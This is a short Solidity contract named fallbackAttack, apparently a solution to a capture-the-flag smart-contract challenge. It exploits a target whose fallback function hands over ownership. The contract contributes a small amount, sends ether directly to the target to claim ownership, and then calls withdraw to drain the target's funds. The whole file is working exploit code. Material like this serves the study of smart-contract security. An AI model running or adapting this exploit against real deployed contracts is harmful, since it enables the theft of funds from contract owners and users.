//SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.17;

interface Fallback{
    function contribute() external payable;
    function getContribution() external view returns(uint);
    function withdraw () external;
}

contract fallbackAttack {
    address private target;

    constructor (address _target)  payable {
        target = _target;
    }

    function contribute() payable external {
        Fallback(target).contribute{value:  msg.value}();
        
    }

    function claimOwnership() payable external {
        (bool sent, bytes memory data) = target.call{value:  msg.value}("");
        require (sent, "E1");
        withdraw();
        
    }

    function withdraw() internal {
        Fallback(target).withdraw();
        
    }

    receive() external payable{

    }

}